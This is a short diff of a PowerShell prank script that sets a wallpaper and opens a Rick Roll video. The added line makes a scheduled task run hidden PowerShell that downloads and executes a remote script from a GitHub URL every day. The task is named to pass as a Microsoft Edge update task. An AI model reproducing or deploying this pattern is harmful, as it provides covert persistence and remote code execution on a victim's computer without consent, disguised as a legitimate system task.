@@ -53,7 +53,7 @@ namespace Win32{
 
 add-type $code
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
-$action = New-ScheduledTaskAction -Execute 'C:\temp\lobster.bat'
+$action = New-ScheduledTaskAction -Execute 'powershell' -Argument -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/notrickroll.ps1');" 
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
